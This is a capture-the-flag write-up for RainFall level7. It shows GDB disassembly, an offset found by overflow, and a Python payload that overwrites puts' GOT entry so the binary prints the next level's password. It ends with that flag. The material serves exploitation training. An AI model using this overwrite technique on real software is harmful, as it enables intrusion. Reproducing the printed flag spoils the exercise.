# level7 Exploit

### Steps

### Step 1: Decompile the Binary

Use GDB to disassemble the `level7` binary and understand its functionality:

```bash
level7@RainFall:~$ gdb level7
(gdb) disassemble main
(gdb) disassemble m
```

You can convert the assembly code to C using the [CodeConvert](https://www.codeconvert.ai/assembly-to-c++-converter) tool for better understanding.

### Step 2: Analyze Available Functions

- The main function (`main`) executes:
  ```c
  __stream = fopen("/home/user/level8/.pass", "r");
  fgets(c, 68, __stream);
  ```
  This stores the flag in the variable `c`.

- The `c` variable is printed in the `m` function, which is never called:
  ```c
  void m(void *param_1, int param_2, char *param_3, int param_4, int param_5) {
      time_t param2;
      param2 = time(NULL);
      printf("%s - %d\n", c, param2);
  }
  ```

The goal is to call the `m` function after `fgets` reads the flag.

### Step 3: Find Function Addresses

Use GDB to find the addresses of the functions:

```bash
level7@RainFall:~$ gdb level7
(gdb) info functions
```

Addresses found:
- Address of the `m` function: `0x080484f4`
- Address of the `puts` function: `0x08049928`

### Step 4: Determine Offset

Run the following to determine at which position the overflow occurs:

```bash
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Aa8Aa9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /home/user/level7/level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Aa8Aa9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0xb7eb8aa8 in ?? () from /lib/i386-linux-gnu/libc.so.6
(gdb) info registers
```

You should see something like:

```gdb
eax            0x37614136	929120566
ecx            0x0	0
edx            0x37614136	929120566
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff63c	0xbffff63c
ebp            0xbffff668	0xbffff668
esi            0x0	0
edi            0x0	0
eip            0xb7eb8aa8	0xb7eb8aa8
eflags         0x200286	[ PF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```

Use the [Wiremask offset calculator](https://wiremask.eu/tools/buffer-overflow-pattern-offset/) to find that `0x37614136` corresponds to an offset of 20.

### Step 5: Construct the Exploit

With the overflow of the first `strcpy`, we can change `b[1]` to have the address of the `puts` function.

**Addresses:**
- `m`: `0x080484f4` -> `\xf4\x84\x04\x08`
- `puts`: `0x08049928` -> `\x28\x99\x04\x08`

Using Python to construct the payload:

```bash
$(python -c 'print("A" * 20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
```

### Step 6: Running the Exploit

Execute the exploit:

```bash
level7@RainFall:~$ ./level7 $(python -c 'print("A" * 20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
```

### Step 7: Result

You should see the output of the `m` function, which prints the contents of the `c` variable, the flag:

```bash
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```
